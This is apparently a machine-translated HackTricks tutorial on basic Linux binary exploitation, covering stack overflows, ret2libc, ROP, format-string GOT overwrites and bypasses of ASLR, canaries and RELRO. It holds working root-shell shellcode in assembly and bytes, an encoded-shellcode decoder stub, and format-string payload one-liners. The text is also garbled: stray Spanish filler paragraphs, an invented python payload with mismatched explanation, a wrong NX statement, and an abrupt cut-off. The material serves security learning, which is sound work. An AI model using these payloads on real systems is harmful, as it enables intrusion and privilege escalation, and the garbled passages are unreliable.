# Linux漏洞利用（基础）（SPA）

## Linux漏洞利用（基础）（SPA）

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## **ASLR**

地址空间布局随机化

**全局禁用ASLR（需要root权限）**：\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
全局重新启用ASLR：echo 2 > /proc/sys/kernel/randomize\_va\_space

**禁用单次执行**（不需要root权限）：\
setarch \`arch\` -R ./example arguments\
setarch \`uname -m\` -R ./example arguments

**禁用堆栈执行保护**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack example.c -o example

**核心文件**\
ulimit -c unlimited\
gdb /exec core\_file\
/etc/security/limits.conf -> \* soft core unlimited

**Text**\
**Data**\
**BSS**\
**Heap**

**Stack**

**BSS段**：未初始化的全局或静态变量
```
static int i;
```
**数据部分**：全局或静态初始化的变量

En esta sección, se explorarán las técnicas de explotación que se pueden utilizar para aprovechar las variables globales o estáticas inicializadas en un programa de Linux. Estas variables son aquellas que se declaran fuera de cualquier función y se inicializan con un valor específico.

Las variables globales o estáticas inicializadas pueden ser un objetivo atractivo para un hacker, ya que pueden contener información sensible o ser utilizadas para manipular el flujo de ejecución del programa. Al explotar estas variables, un hacker puede obtener acceso no autorizado a datos confidenciales o incluso ejecutar código malicioso en el sistema.

En esta sección, se presentarán diferentes técnicas de explotación que se pueden utilizar para aprovechar estas variables. Estas técnicas incluyen la sobrescritura de variables, la manipulación de punteros y la explotación de desbordamientos de búfer.

Es importante tener en cuenta que la explotación de variables globales o estáticas inicializadas es una actividad ilegal y se debe realizar solo con fines educativos y de investigación. El uso de estas técnicas sin el consentimiento del propietario del sistema es un delito y puede tener consecuencias legales graves.
```
int i = 5;
```
**文本部分**：代码指令（opcodes）的说明

**堆部分**：动态分配的缓冲区（malloc()，calloc()，realloc()）

**栈部分**：堆栈（传递的参数，环境字符串（env），局部变量...）

## **1.栈溢出**

> 缓冲区溢出，堆栈溢出，堆栈破坏

段错误：当尝试访问未分配给进程的内存地址时发生。

要获取程序中函数的地址，可以执行以下操作：
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### 调用sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2. SHELLCODE**

查看内核中断：cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; 清空eax\
xor ebx, ebx ; ebx = 0，因为没有要传递的参数\
mov al, 0x01 ; eax = 1 —> \_\_NR\_exit 1\
int 0x80 ; 执行系统调用

**nasm -f elf assembly.asm** —> 得到一个 .o 文件\
**ld assembly.o -o shellcodeout** —> 得到一个由汇编代码组成的可执行文件，可以使用 **objdump** 提取操作码\
**objdump -d -Mintel ./shellcodeout** —> 查看是否是我们的 shellcode，并提取操作码

**验证 shellcode 是否有效**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
要确保系统调用正确执行，需要编译前面的程序，并在**strace ./编译后的程序**中查看系统调用。

在创建shellcode时，可以使用一个技巧。第一条指令是跳转到一个调用。调用会调用原始代码，并将EIP压入堆栈。在call指令之后，我们插入了所需的字符串，因此可以使用该EIP指向字符串，并继续执行代码。

例如 **TRICK (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**使用堆栈(/bin/sh)进行执行代码：**

```python
import struct

# 构造payload
payload = b"A" * 44

# 将/bin/sh字符串的地址转换为Little Endian格式
bin_sh_addr = struct.pack("<I", 0xb7f83a24)

# 将/bin/sh字符串的地址添加到payload中
payload += bin_sh_addr

# 打印payload
print(payload)
```

这段代码演示了如何使用堆栈(/bin/sh)来执行代码。首先，我们构造了一个长度为44字节的payload。然后，我们使用`struct.pack`函数将`/bin/sh`字符串的地址转换为Little Endian格式，并将其添加到payload中。最后，我们打印出payload。
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**EJ FNSTENV:**

EJ FNSTENV是一种基本的Linux漏洞利用技术，用于利用栈溢出漏洞。在利用此技术之前，需要了解一些基本概念和步骤。

1. **栈溢出漏洞**：栈溢出漏洞是一种常见的安全漏洞，当程序在处理数据时，写入超过预分配缓冲区大小的数据时，会导致数据溢出到相邻的内存区域，从而可能导致程序崩溃或执行恶意代码。

2. **EIP寄存器**：EIP（扩展指令指针）寄存器存储下一条将要执行的指令的内存地址。通过控制EIP寄存器的值，可以改变程序的执行流程。

3. **ESP寄存器**：ESP（扩展堆栈指针）寄存器指向当前栈顶的内存地址。通过控制ESP寄存器的值，可以控制栈的布局和执行流程。

4. **FNSTENV指令**：FNSTENV指令用于将FPU（浮点处理单元）环境保存到内存中的指定位置。在利用栈溢出漏洞时，可以使用FNSTENV指令来获取栈上的环境数据。

利用EJ FNSTENV技术的基本步骤如下：

1. 确定目标程序中存在栈溢出漏洞，并找到溢出点。

2. 构造恶意输入数据，使其超过预分配缓冲区的大小，从而触发栈溢出。

3. 在溢出点处，覆盖EIP寄存器的值为指向恶意代码的内存地址。

4. 在恶意代码中，使用FNSTENV指令将FPU环境保存到栈上。

5. 通过控制ESP寄存器的值，将栈指针指向保存FPU环境的位置。

6. 通过控制EIP寄存器的值，将程序的执行流程转移到恶意代码。

通过理解和掌握EJ FNSTENV技术，可以有效利用栈溢出漏洞，实现对目标系统的攻击。然而，使用此技术进行攻击是非法的，只能在合法的渗透测试活动中使用。
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Egg Hunter:**

这是一个小代码，它遍历与进程关联的内存页面，以查找存储在其中的shellcode（查找shellcode中的某个签名）。在只有很小的空间来注入代码的情况下非常有用。

**多态Shellcode**

这些是加密的shellcode，其中包含一小段代码来解密并跳转到它，使用Call-Pop技巧，这是一个**凯撒密码加密的示例**：
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
1. **攻击帧指针 (EBP)**

在我们可以修改EBP但无法修改EIP的情况下非常有用。

我们知道在退出一个函数时会执行以下汇编代码：
```
movl               %ebp, %esp
popl                %ebp
ret
```
以这种方式，如果在被另一个函数调用的函数（fvuln）中退出时可以修改EBP，那么当调用fvuln的函数结束时，它的EIP可以被修改。

在fvuln中，可以插入一个指向shellcode地址+4的伪造EBP（需要加4是因为有一个pop指令）。这样，在函数退出时，ESP中将存储&(\&Shellcode)+4的值，通过pop指令将ESP减去4，这样当ret指令执行时，ESP将指向shellcode的地址。

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + 填充 + &(\&Shellcode)+4

**Off-by-One Exploit**\
只允许修改EBP的最低有效字节。可以执行与上述类似的攻击，但是存储shellcode地址的内存必须与EBP共享前3个字节。

## **4. Return to Libc 方法**

当堆栈不可执行或留下的缓冲区太小无法修改时，这种方法非常有用。

ASLR导致每次执行时函数在内存中的位置都不同。因此，在这种情况下，此方法可能无效。对于远程服务器，由于程序在同一地址上不断执行，因此此方法可能很有用。

* **cdecl(C声明)**：将参数存储在堆栈中，并在函数退出后清理堆栈
* **stdcall(标准调用)**：将参数存储在堆栈中，并由被调用的函数清理堆栈
* **fastcall**：将前两个参数存储在寄存器中，其余参数存储在堆栈中

将libc中system函数的地址放入堆栈，并将字符串“/bin/sh”作为参数传递给它，通常是从环境变量中获取。此外，使用exit函数的地址，以便在不再需要shell时退出程序而不会出现问题（并写入日志）。

**export SHELL=/bin/sh**

要找到所需的地址，可以在**GDB**中查看：\
**p system**\
**p exit**\
**rabin2 -i executable** —> 给出程序加载时使用的所有函数的地址\
（在start或某个断点处）：**x/500s $esp** —> 在这里查找字符串/bin/sh

一旦获得这些地址，**exploit**如下：

“A” \* EBP距离 + 4（EBP：可以是4个“A”，但最好是真正的EBP以避免段错误） + **system**地址（将覆盖EIP） + **exit**地址（在system("/bin/sh")退出后，将调用此函数，因为堆栈的前4个字节被视为要执行的下一个EIP地址） + **"/bin/sh"**地址（作为参数传递给system）

这样，EIP将被覆盖为system的地址，它将以字符串“/bin/sh”作为参数，并在退出system后执行exit函数。

可能会遇到某个函数地址的某个字节为null或空格（\x20）的情况。在这种情况下，可以反汇编该函数之前的地址，因为可能有多个NOP指令，可以在直接调用函数之前调用其中一个（例如使用 > x/8i system-4）。

这种方法有效，因为使用ret指令而不是call指令调用system函数时，函数会将前4个字节视为要返回的EIP地址。

使用此方法的一个有趣技巧是调用**strncpy()**将payload从堆栈移动到堆，并随后使用**gets()**执行该payload。

另一个有趣的技巧是使用**mprotect()**，它允许为内存的任何部分分配所需的权限。它适用于BDS、MacOS和OpenBSD，但在Linux上不适用（控制不允许同时授予写入和执行权限）。使用此攻击，可以将堆栈重新配置为可执行。

**函数链**

基于前面的技术，这种exploit的形式是：\
填充 + \&Function1 + \&pop;ret; + \&arg\_fun1 + \&Function2 + \&pop;ret; + \&arg\_fun2 + ...

这样可以链接要调用的函数。此外，如果要使用具有多个参数的函数，可以放置所需的参数（例如4个）并查找具有opcodes的地址：pop，pop，pop，pop，ret —> **objdump -d executable**

**通过伪造帧链（EBP链）进行链接**

利用可以操纵EBP的能力，通过EBP和"leave;ret"来链接多个函数的执行。

填充

* 在EBP中放置一个指向以下内容的伪造EBP：2nd fake EBP + 要执行的函数（\&system() + \&leave;ret + &“/bin/sh”）
* 在EIP中放置一个指向&(leave;ret)函数的地址

将shellcode初始化为指向shellcode的下一部分的地址，例如：2nd fake EBP + \&system() + &(leave;ret;) + &”/bin/sh”

第二个EBP将是：3rd fake EBP + \&system() + &(leave;ret;) + &”/bin/ls”

这个shellcode可以无限重复在可以访问的内存部分中，从而将shellcode轻松地分割为小块内存。

（通过混合之前介绍的EBP和ret2lib漏洞，可以链接函数的执行）
## **5.补充方法**

**Ret2Ret**

当无法将堆栈地址放入EIP（检查EIP不包含0xbf）或无法计算shellcode的位置时，这个方法非常有用。但是，受漏洞影响的函数接受一个参数（shellcode将放在这里）。

通过将EIP更改为指向一个**ret**地址，将加载下一个地址（即函数的第一个参数的地址）。也就是说，将加载shellcode。

Exploit的结构为：SHELLCODE + 填充（直到EIP）+ **\&ret**（堆栈的下几个字节指向shellcode的开头，因为将参数地址放入堆栈）

似乎像**strncpy**这样的函数在完成后会从堆栈中删除存储shellcode的地址，从而使这种技术无法使用。也就是说，传递给函数的参数地址（存储shellcode的地址）被修改为0x00，因此在调用第二个**ret**时会遇到0x00并导致程序崩溃。
```
**Ret2PopRet**
```
如果我们无法控制第一个参数，但可以控制第二个或第三个参数，我们可以使用pop-ret或pop-pop-ret的地址来覆盖EIP。

**Murat技术**

在Linux中，所有程序的映射都从0xbfffffff开始。

通过观察Linux中新进程的堆栈构建方式，可以开发一种利用程序在仅有shellcode变量的环境中启动的exploit。然后，可以计算出shellcode变量的地址：addr = 0xbfffffff - 4 - strlen(FULL\_EXECUTABLE\_NAME) - strlen(shellcode)

这样，我们可以轻松地获得存储shellcode的环境变量的地址。

这是因为execle函数允许创建仅包含所需环境变量的环境。

**Jump to ESP: Windows Style**

由于ESP始终指向堆栈的开头，这种技术涉及将EIP替换为调用jmp esp或call esp的地址。这样，在覆盖EIP后，shellcode将保存在ESP执行ret后的位置，即shellcode所在的地址。

如果Windows或Linux上未启用ASLR，可以调用存储在共享对象中的jmp esp或call esp。如果启用了ASLR，则可以在受漏洞影响的程序本身中查找。

此外，将shellcode放置在EIP损坏之后而不是堆栈中间，使得在函数执行过程中执行的push或pop指令不会触及shellcode（如果放在函数堆栈中间可能会发生这种情况）。

类似于此，如果我们知道一个函数返回存储shellcode的地址，可以调用call eax或jmp eax（ret2eax）。

**ROP（Return Oriented Programming）或借用的代码块**

被调用的代码块称为gadgets。

这种技术涉及使用ret2libc技术和pop,ret指令来链接不同的函数调用。

在某些处理器架构中，每个指令是一个32位的指令集（例如MIPS）。然而，在Intel中，指令的大小是可变的，多个指令可以共享一组位，例如：

**movl $0xe4ff, -0x(%ebp)** —> 包含字节0xffe4，也可以表示为：**jmp \*%esp**

通过这种方式，可以执行一些实际上不在原始程序中的指令。

ROPgadget.py帮助我们在二进制文件中查找值。

该程序还用于创建有效载荷（payloads）。您可以提供要提取ROP的库，它将生成一个Python的payload，您只需提供该库的地址，payload就准备好用作shellcode。此外，由于它使用系统调用，它不会在堆栈上实际执行任何操作，而只是保存将通过ret执行的ROP的地址。要使用此payload，需要通过ret指令调用payload。

**整数溢出**

当变量无法处理传递给它的如此大的数字时，就会发生此类溢出，可能是由于有符号和无符号变量之间的混淆，例如：
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
在上面的示例中，我们可以看到程序期望接收两个参数。第一个参数是下一个字符串的长度，第二个参数是字符串本身。

如果我们将第一个参数设置为负数，那么len < 256的条件将不会满足，我们就能够绕过这个过滤器。而且，strlen(buffer)也会小于l，因为l是无符号整数，它的值会非常大。

这种类型的溢出并不是为了在程序的进程中写入任何内容，而是为了绕过设计不良的过滤器，以便利用其他漏洞。

**未初始化的变量**

未初始化的变量可能会取任意值，这可能是一个有趣的观察点。它可能会取决于前一个函数中的变量的值，并且这个变量可能会受到攻击者的控制。

## **格式化字符串**

在C语言中，**`printf`**是一个用于**打印**字符串的函数。这个函数期望的**第一个参数**是**带有格式化符号的原始文本**。接下来的参数是用于**替换**原始文本中的**格式化符号**的**值**。

当一个**攻击者的文本被放置为这个函数的第一个参数**时，就会出现漏洞。攻击者可以利用**printf格式化字符串的能力**来构造一个**特殊的输入**，从而能够**在任意地址写入任意数据**，从而执行任意代码。

格式化符号：
```bash
%08x —> 8 hex bytes
%d —> Entire
%u —> Unsigned
%s —> String
%n —> Number of written bytes
%hn —> Occupies 2 bytes instead of 4
<n>$X —> Direct access, Example: ("%3$d", var1, var2, var3) —> Access to var3
```
**`%n`** **写入**了在**指定地址**中的**已写入字节数**。通过写入与我们需要写入的十六进制数相等的字节数，可以实现**写入任意数据**。
```bash
AAAA%.6000d%4\$n —> Write 6004 in the address indicated by the 4º param
AAAA.%500\$08x —> Param at offset 500
```
### **GOT (全局偏移表) / PLT (过程链接表)**

这是一个包含程序使用的外部函数的地址的表格。

使用以下命令获取该表格的地址：**`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

观察在 GEF 中加载可执行文件后，可以看到在 GOT 中的函数：`gef➤ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

使用 GEF，您可以开始一个调试会话并执行 **`got`** 命令来查看 got 表格：

![](<../../.gitbook/assets/image (621).png>)

在二进制文件中，GOT 包含函数的地址或者 PLT 部分的地址，PLT 部分将加载函数地址。此漏洞的目标是使用 `system` 函数的 PLT 地址来覆盖稍后将要执行的函数的 GOT 条目。理想情况下，您将覆盖将由您控制参数的函数的 GOT（这样您就可以控制发送给系统函数的参数）。

如果脚本中没有使用 `system`，则系统函数在 GOT 中将没有条目。在这种情况下，您将需要首先泄漏 `system` 函数的地址。

**过程链接表**是 ELF 文件中的一个只读表格，存储了所有需要解析的必要符号。当调用这些函数之一时，GOT 将重定向流到 PLT，以便解析函数的地址并将其写入 GOT。然后，下次对该地址执行调用时，函数将直接被调用，无需解析。

您可以使用以下命令查看 PLT 地址：**`objdump -j .plt -d ./vuln_binary`**

### **利用流程**

如前所述，目标是要覆盖稍后将要调用的 GOT 表中的函数的地址。理想情况下，我们可以将地址设置为位于可执行部分中的 shellcode，但很可能您无法在可执行部分中编写 shellcode。因此，另一个选择是覆盖一个从用户那里接收其参数的函数，并将其指向 `system` 函数。

通常，写入地址需要两个步骤：首先写入地址的 2 个字节，然后写入另外 2 个字节。为此，使用 `$hn`。

HOB 用于地址的 2 个高位字节\
LOB 用于地址的 2 个低位字节

因此，由于格式化字符串的工作方式，您需要首先写入 \[HOB, LOB] 中较小的那个，然后再写入另一个。

如果 HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

如果 HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB_shellcode-8 NºParam_dir_HOB LOB_shell-HOB_shell NºParam_dir_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **格式化字符串利用模板**

您可以在此处找到使用格式化字符串利用 GOT 的模板：

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini_array**

基本上，这是一个在程序结束之前将被调用的函数结构。如果您可以通过跳转到一个地址来调用您的 shellcode，或者在需要再次返回到主函数以便第二次利用格式化字符串的情况下，这将非常有用。
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
注意，这**不会**创建一个**无限循环**，因为当你回到主函数时，堆栈的末尾可能已经被破坏，函数不会再次被调用。因此，通过这种方式，你将能够多执行一次漏洞。

### 使用格式化字符串转储内容

格式化字符串也可以被滥用来从程序的内存中转储内容。例如，在下面的情况中，堆栈中有一个指向标志的局部变量。如果你找到了指向标志的指针在内存中的位置，你可以使printf访问该地址并打印标志：

所以，标志位于**0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

从泄漏中，你可以看到指向标志的指针在第8个参数中：

![](<../../.gitbook/assets/image (623).png>)

因此，通过访问第8个参数，你可以获得标志：

![](<../../.gitbook/assets/image (624).png>)

请注意，在之前的利用中，意识到你可以泄漏内容后，你可以将指针设置为printf到可执行文件加载的部分，并将其完全转储！

### DTOR

{% hint style="danger" %}
现在很少见到带有dtor部分的二进制文件。
{% endhint %}

析构函数是在程序结束之前执行的函数。如果你成功将一个shellcode的地址写入`__DTOR_END__`，那么它将在程序结束之前执行。使用以下命令获取此部分的地址：
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep “__DTOR”
```
通常，您会在值`ffffffff`和`00000000`之间找到**DTOR**部分。因此，如果您只看到这些值，这意味着**没有注册任何函数**。因此，将**`00000000`**覆盖为指向要执行的**shellcode的地址**。

### **格式化字符串到缓冲区溢出**

**sprintf**将格式化字符串**移动到**变量中。因此，您可以滥用字符串的**格式化**，以导致将内容复制到的变量中的**缓冲区溢出**。\
例如，有效载荷`%.44xAAAA`将在变量中**写入44B+"AAAA"**，这可能会导致缓冲区溢出。

### **\_\_atexit结构**

{% hint style="danger" %}
现在很**奇怪去利用这个**。
{% endhint %}

**`atexit()`**是一个函数，其参数是**其他函数**。这些**函数**将在执行**`exit()`**或**main**的**返回**时**执行**。\
如果您可以**修改**这些**函数**中的任何一个的**地址**，使其指向例如shellcode，那么您将**控制该进程**，但是这目前更加复杂。\
当前要执行的**函数的地址**被隐藏在几个结构后面，最后指向的地址不是函数的地址，而是使用**XOR加密**和**随机密钥**进行位移。因此，目前此攻击向量在x86和x64\_86上**不太有用**。\
**加密函数**是**`PTR_MANGLE`**。其他架构（如m68k，mips32，mips64，aarch64，arm，hppa...）**不实现加密**函数，因为它**返回与输入相同**的值。因此，这些架构可以通过此向量进行攻击。

### **setjmp()和longjmp()**

{% hint style="danger" %}
现在很**奇怪去利用这个**。
{% endhint %}

**`Setjmp()`**允许**保存**上下文（寄存器）\
**`longjmp()`**允许**恢复**上下文。\
**保存的寄存器**是：`EBX，ESI，EDI，ESP，EIP，EBP`\
问题在于EIP和ESP通过**`PTR_MANGLE`**函数传递，因此**易受此攻击的架构与上述相同**。\
它们对于错误恢复或中断很有用。\
但是，根据我所读到的，其他寄存器没有受到保护，因此，如果在被调用的函数中存在`call ebx`，`call esi`或`call edi`，则可以控制。或者还可以修改EBP以修改ESP。

**C++中的VTable和VPTR**

每个类都有一个**Vtable**，它是一个指向方法的指针数组。

每个**类的对象**都有一个**VPtr**，它是指向其类数组的**指针**。VPtr是每个对象头的一部分，因此，如果可以**覆盖**VPtr，则可以将其**修改**为指向虚拟方法，以便执行函数时转到shellcode。

## **预防措施和逃避**

**不那么随机的ASLR**

PaX将进程的地址空间分为3组：

已初始化和未初始化的代码和数据：.text，.data和.bss —> delta\_exec变量中的16位熵，此变量在每个进程中随机初始化，并与初始地址相加

由mmap()分配的内存和共享库 —> 16位，delta\_mmap

堆栈 —> 24位，delta\_stack —> 实际上是11位（从第10个字节到第20个字节，包括） —> 对齐到16字节 —> 堆栈的实际可能地址为524,288个

环境变量和参数在堆栈上的移动量小于缓冲区。

**Return-into-printf**

这是一种将缓冲区溢出转换为格式字符串错误的技术。它涉及替换EIP，使其指向函数的printf，并将操纵的格式字符串作为参数传递给它，以获取有关进程状态的值。

**对库的攻击**

库位于具有16位随机性的位置 = 65636个可能的地址。如果一个易受攻击的服务器调用了fork()，则内存地址空间将在子进程中复制并保持不变。因此，可以尝试对libc的usleep()函数进行暴力破解，将“16”作为参数传递给它，以便当其响应时间超过正常时间时，该函数将被找到。知道该函数在哪里后，可以获取delta\_mmap并计算其他值。

唯一确保ASLR正常工作的方法是使用64位架构。在那里，没有暴力破解攻击。

**StackGuard和StackShield**

**StackGuard**在EIP之前插入 —> 0x000aff0d(null, \n, EndOfFile(EOF), \r) —> 仍然容易受到recv()，memcpy()，read()，bcoy()的攻击，并且不保护EBP

**StackShield**比StackGuard更复杂

它在全局返回堆栈表中保存所有的EIP返回地址，以便溢出不会造成任何损害。此外，可以比较这两个地址以查看是否发生了溢出。

还可以将返回地址与限制值进行比较，因此，如果EIP转到与通常情况不同的位置，例如数据空间，就会知道。但是，这可以通过Ret-to-lib，ROP或ret2ret绕过。

正如您可以看到的，stackshield也不保护本地变量。

**Stack Smash Protector (ProPolice) -fstack-protector**

它将canary放在EBP之前。重新排列本地变量，使缓冲区位于最高位置，因此无法覆盖其他变量。

此外，它在堆栈上方（在本地变量上方）执行安全的参数副本，并使用这些副本作为参数。

它无法保护少于8个元素的数组或作为用户结构的一部分的缓冲区。

canary是从“/dev/urandom”中获取的随机数，否则为0xff0a0000。它存储在TLS（线程本地存储）中。线程共享相同的内存空间，TLS是每个线程的全局或静态变量的区域。但是，原则上，这些变量是从父进程复制的，尽管子进程可以修改这些数据而不会修改父进程或其他子进程的数据。问题在于，如果使用fork()但不创建新的canary，则所有进程（父进程和子进程）都使用相同的canary。在i386中，它存储在gs:0x14中，在x86\_64中，它存储在fs:0x28中。

此保护程序会定位具有可能受到攻击的缓冲区的函数，并在函数开头插入代码以放置canary，并在末尾插入代码以进行检查。
fork()函数会创建一个与父进程完全相同的子进程，因此，如果一个Web服务器调用fork()函数，就可以通过逐字节的暴力破解攻击来找出正在使用的canary值。

如果在fork()之后使用execve()函数，就会覆盖空间，从而使攻击变得不可能。vfork()函数允许在子进程尝试写入之前执行子进程，然后才创建副本。

**只读重定位（RELRO）**

### RELRO

**只读重定位（Read only Relocation，RELRO）**会影响内存权限，类似于NX。不同之处在于，NX使堆栈可执行，而RELRO使**某些内容只读**，因此我们**无法写入**它们。我见过的最常见的障碍是阻止我们进行**got表覆盖**，稍后将介绍。got表保存了libc函数的地址，以便二进制文件知道这些地址并调用它们。让我们看看具有和没有RELRO的二进制文件的got表条目的内存权限是什么样的。

有RELRO时：
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
